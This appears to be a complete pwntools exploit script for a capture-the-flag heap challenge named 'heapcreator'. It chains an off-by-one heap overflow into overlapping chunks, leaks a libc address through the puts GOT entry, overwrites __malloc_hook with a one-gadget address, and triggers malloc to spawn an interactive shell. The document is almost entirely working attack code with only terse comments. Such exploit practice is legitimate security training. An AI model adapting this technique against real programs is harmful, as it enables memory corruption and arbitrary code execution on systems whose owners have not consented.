from pwn import *

p = process('./heapcreator')
context.log_level = 'debug'
elf = ELF('heapcreator')
libc = ELF('libc.so')

def create(size,content) :
    p.sendlineafter('Your choice :','1')
    p.sendlineafter('Size of Heap : ',str(size))
    p.sendlineafter('Content of heap:',content)

def edit(index,content) :
    p.sendlineafter('Your choice :','2')
    p.sendlineafter('Index :',str(index))
    p.sendlineafter('Content of heap : ',content)

def show(index) :
    p.sendlineafter('Your choice :','3')
    p.sendlineafter('Index :',str(index))

def delete(index) :
    p.sendlineafter('Your choice :','4')
    p.sendlineafter('Index :',str(index))

#leak --> libc
create(24,'A'*24)
create(24,'A'*24)
edit(0,'A'*25)
delete(1)
create(0x30,'A'*23)
puts_addr = elf.got['puts']
payload = 'A'*24 + p64(0x21) + p64(0x30) + p64(puts_addr)
edit(1,payload)
show(1)

#leak --> libc_base
p.recvuntil('Content : ')
data = u64(p.recv(6).ljust(8,'\x00'))
log.success('leak_addr:'+hex(data))
base_addr = data - libc.symbols['puts']

#mallco --> system
malloc_addr = base_addr + libc.symbols['__malloc_hook']
payload2 = 'A'*24 + p64(0x21) + p64(0x30) + p64(malloc_addr)
create(24,'A'*24)
create(24,'A'*24)
edit(2,'A'*25)
delete(3)
create(0x30,'A'*23)
edit(3,payload2)
edit(3,p64(base_addr + 0x4526a))

#malloc --> execve()
p.sendlineafter('Your choice :','1')

p.interactive()
